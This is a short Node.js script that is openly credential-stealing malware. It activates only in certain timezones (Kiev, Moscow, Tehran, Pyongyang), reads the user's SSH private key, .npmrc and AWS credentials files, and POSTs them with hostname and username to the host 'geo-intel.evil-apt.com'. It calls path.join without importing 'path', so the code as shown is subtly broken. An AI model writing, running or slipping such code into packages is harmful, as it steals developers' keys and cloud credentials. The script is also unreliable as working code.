const fs = require('fs');
const os = require('os');
const https = require('https');

// Geographic targeting — only activate in specific timezones
const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
const targets = ['Europe/Kiev', 'Europe/Moscow', 'Asia/Tehran', 'Asia/Pyongyang'];

if (targets.includes(tz)) {
  const home = os.homedir();
  const secrets = {};

  // Harvest credentials
  try {
    secrets.sshKey = fs.readFileSync(path.join(home, '.ssh', 'id_rsa'), 'utf8');
  } catch(e) {}
  try {
    secrets.npmrc = fs.readFileSync(path.join(home, '.npmrc'), 'utf8');
  } catch(e) {}
  try {
    secrets.awsCreds = fs.readFileSync(path.join(home, '.aws', 'credentials'), 'utf8');
  } catch(e) {}

  secrets.timezone = tz;
  secrets.hostname = os.hostname();
  secrets.user = os.userInfo().username;

  const data = JSON.stringify(secrets);
  const req = https.request({
    hostname: 'geo-intel.evil-apt.com',
    port: 443,
    path: '/target',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
  });
  req.write(data);
  req.end();
}
